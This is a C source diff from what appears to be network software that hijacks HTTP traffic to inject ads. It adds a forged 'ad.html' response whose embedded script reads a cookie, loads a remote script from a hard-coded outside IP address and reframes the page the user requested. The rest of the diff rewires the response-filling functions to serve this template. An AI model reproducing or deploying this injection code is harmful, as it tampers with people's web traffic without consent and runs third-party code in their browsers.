@@ -248,6 +248,7 @@ char *http_head_response7=
 // </html>
 
 
+#if TEMPLATE_SEGMENT_ON
 http_body_t default_http_body[AD_TEMPLATE_MAX] = 
 {
     {
@@ -419,6 +420,68 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
     },
 #endif
 };
+#else
+http_body_t default_http_body[AD_TEMPLATE_MAX] = 
+{
+    {
+        .name = "ad.html",
+        .content =
+            "<!doctype html>\n"
+            "<html>\n"
+            "<head>\n"
+            "<style>html {\n"
+            "height: 100%;\n"
+            "}</style>\n"
+            "</head>\n"
+            "<body style=\"background-color:transparent; margin:0px; height:100%\">\n"
+            "<div id=\'v\' name=\'v\' style=\"display:block;clear:both;margin:0px;width:100%;height:100%;color:#FFF;\">\n"
+            "<iframe id=\'m\' name=\'m\' width=\'100%\' height=\'100%\' frameborder=\'0\'></iframe>\n"
+            "</div>\n"
+            "<script>(function () {\n"
+            "        var d = document;\n"
+            "        var uki = d.cookie.split(\"; \");\n"
+            "        var wP_v;\n"
+            "        for (var i = 0; i < uki.length; i++) {\n"
+            "        var arr = uki[i].split(\"=\");\n"
+            "        if (\"wP_v\" == arr[0]) {\n"
+            "        wP_v = arr[1];\n"
+            "        break;\n"
+            "        }\n"
+            "        ;\n"
+            "        }\n"
+            "        ;\n"
+            "        var f = d.location.href;\n"
+            "        var ua = navigator.userAgent.toLowerCase();\n"
+            "        var url = \"http://61.174.50.211:8001/tv/adc.php\";\n"
+            "        var head = d.getElementsByTagName(\"head\")[0];\n"
+            "        var im = d.getElementById(\"m\");\n"
+            "        var tb = d.createElement(\'script\');\n"
+            "        tb.async = \"true\";\n"
+            "        tb.src = url.replace(/&v/, wP_v);\n"
+            "        tb.type = \'text/javascript\';\n"
+            "        head.appendChild(tb);\n"
+            "        if (ua.indexOf(\"windows\") < 0) {\n"
+            "            var meta = d.createElement(\'meta\');\n"
+            "            meta.name = \"viewport\";\n"
+            "            meta.content = \"width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no\";\n"
+            "            head.appendChild(meta);\n"
+            "        }\n"
+            "        ;\n"
+            "        im.src = f + (f.indexOf(\"&\") < 0 ? \'?\' : \'&\') + \'_t=t\';\n"
+            "        if (ua.indexOf(\"iphone\") > 0) {\n"
+            "            im.width = window.innerWidth;\n"
+            "            im.scrolling = \"no\";\n"
+            "        }\n"
+            "        ;\n"
+            "        window.addEventListener(\"resize\", function () {\n"
+            "                im.width = window.innerWidth;\n"
+            "                }, false);\n"
+            "})();</script>\n"
+            "</body>\n"
+            "</html>\n",
+    },
+};
+#endif
 
 uint8_t send_mode = ADT_SEND_MULTI;
 berr adt_get_send(uint8_t *send)
@@ -466,13 +529,18 @@ uint16_t
 http_content_len_get(hytag_t *hytag)
 {
     uint16_t len = 0;
+#if TEMPLATE_SEGMENT_ON
     len += http_body[hytag->template].head_len;//strlen(http_body[hytag->template].head);    
     //len += strlen(hytag->hijack_url);
     len += hytag->url_len;
     len += http_body[hytag->template].tail_len;//strlen(http_body[hytag->template].tail);
+#else
+    len += http_body[hytag->template].content_len;
+#endif
     return len;
 }
 
+#if 0
 berr ads_gzip_and_fill_content( char *buf, uint16_t *out_len, hytag_t *hytag)
 {
     size_t len = 0;
@@ -519,6 +587,7 @@ berr ads_gzip_and_fill_content( char *buf, uint16_t *out_len, hytag_t *hytag)
     *out_len = (uint16_t) outlen;
     return E_SUCCESS;
 }
+#endif
 
 
 #if 0
@@ -728,8 +797,13 @@ berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
         http_head_response6, http_head_response7);*/
     if( adt_send_is_single())
     {
+#if TEMPLATE_SEGMENT_ON
         len += snprintf(buf+len, 2048-len, "%s%s%s", 
         http_body[hytag->template].head, hytag->url, http_body[hytag->template].tail);                
+#else
+        len += snprintf(buf+len, 2048-len, "%s", 
+        http_body[hytag->template].content);
+#endif
     }
     hytag->l5_len = len;
     return E_SUCCESS;
@@ -741,6 +815,7 @@ berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
 #endif
 
 
+#if TEMPLATE_SEGMENT_ON
 berr ads_http_content_fill(char *buf, hytag_t *hytag)
 {
     uint16_t len = 0;
@@ -863,6 +938,57 @@ berr ads_http_content_fill(char *buf, hytag_t *hytag)
     debug("hytag->l5_len(%d), hytag->fill_len(%d)", hytag->l5_len, hytag->fill_len);
     return E_SUCCESS;
 }
+#else
+berr ads_http_content_fill(char *buf, hytag_t *hytag)
+{
+    uint16_t len = 0;
+    char *content_buff[10] = {0};
+    char *content = http_body[hytag->template].content;
+
+    int content_len = http_body[hytag->template].content_len;
+    
+    uint16_t start;
+    uint16_t l;
+
+    if ( NULL == buf || NULL == hytag )
+    {
+        BRET(E_PARAM);
+    }
+
+    debug("hytag->content_offset(%d), hytag->fill_len(%d), hytag->content_len(%d)", hytag->content_offset,
+            hytag->fill_len, hytag->content_len);
+    if ( hytag->content_offset + hytag->fill_len > hytag->content_len)
+    {
+        BRET(E_PARAM);
+    }
+    /* first seek the begin */
+    /* start at the content segment */
+    if ( hytag->content_offset < content_len)
+    {
+        debug("start(%d)", start);
+        start = hytag->content_offset;
+        /* seek the end */
+        /* end at the content segment*/
+        if ( hytag->content_offset + hytag->fill_len <= content_len)
+        {
+            l = hytag->fill_len;
+        }
+        /* end at the end  segment */
+        else
+        {
+            /* first segment at the head segment */
+            l = content_len - hytag->content_offset;
+        }
+            memcpy(buf + len, &content[start], (size_t) l);
+            len += l;
+            debug("len(%d)", len);
+    }
+
+    hytag->l5_len = len;
+    debug("hytag->l5_len(%d), hytag->fill_len(%d)", hytag->l5_len, hytag->fill_len);
+    return E_SUCCESS;
+}
+#endif
 
 berr ads_template_fill(http_body_t *http_to, http_body_t *http_from)
 {
@@ -872,12 +998,18 @@ berr ads_template_fill(http_body_t *http_to, http_body_t *http_from)
     }
 
     memcpy(http_to->name, http_from->name, (size_t)strlen(http_from->name));
+#if TEMPLATE_SEGMENT_ON
     memcpy(http_to->head, http_from->head, (size_t)strlen(http_from->head));
     memcpy(http_to->url,  http_from->url,  (size_t)strlen(http_from->url));
     memcpy(http_to->tail, http_from->tail, (size_t)strlen(http_from->tail));
     http_to->head_len = (size_t)strlen(http_from->head);
     http_to->tail_len = (size_t)strlen(http_from->tail);
+#else
+    memcpy(http_to->content, http_from->content, (size_t)strlen(http_from->content));
+    http_to->content_len = (size_t)strlen(http_from->content);
+#endif
     
+    printf("%s %d \n", __func__, __LINE__ );
     return E_SUCCESS;
 }
 
@@ -909,6 +1041,7 @@ http_body_t *adt_get_http_body(void)
     return http_body;
 }
 
+#if TEMPLATE_SEGMENT_ON
 berr adt_fill_template(ad_template_em template, const char *name, char * buff)
 {
     http_body_t *http_to = NULL;
@@ -968,6 +1101,39 @@ berr adt_fill_template(ad_template_em template, const char *name, char * buff)
 
     return E_SUCCESS;
 }
+#else
+berr adt_fill_template(ad_template_em template, const char *name, char * buff)
+{
+    http_body_t *http_to = NULL;
+    char *content= NULL;
+    size_t content_len = 0;
+    int i;
+
+    http_to = &http_body[template];
+
+    memcpy(http_to->name, name, (size_t)strlen(name));
+    
+    content = buff;
+    content_len = strlen(buff);
+    debug("content:");
+    for ( i = 0; i < content_len; i++ )
+    {
+        //printf("%c", buff[i]);
+    }
+
+    memset(http_to, 0, sizeof(http_body_t));
+    memcpy(http_to->name, name, (size_t)strlen(name));
+    memcpy(http_to->content, content, content_len);
+    http_to->content_len = content_len;
+
+    i = template;
+    debug("Template(%d):\n", i);
+    debug("name(%d):%s\n",   (int)strlen(http_body[i].name), http_body[i].name);
+    debug("content(%d):\n%s\n", (int)strlen(http_body[i].content),http_body[i].content);
+
+    return E_SUCCESS;
+}
+#endif
 
 berr adt_set(ad_template_em template, const char *dir_str)
 {
@@ -1046,9 +1212,13 @@ berr ads_template_init(void)
     {
         debug("Template(%d):\n", i);
         debug("name(%d):%s\n",   (int)strlen(http_body[i].name), http_body[i].name);
+#if TEMPLATE_SEGMENT_ON
         debug("head(%d):\n%s\n", (int)strlen(http_body[i].head),http_body[i].head);
         debug("url(%d):\n%s\n",  (int)strlen(http_body[i].url), http_body[i].url);
         debug("tail(%d):\n%s\n", (int)strlen(http_body[i].tail),http_body[i].tail);
+#else
+        debug("content(%d):\n%s\n", (int)strlen(http_body[i].content),http_body[i].content);
+#endif
     }
     printf("ads template init success!\n");
 
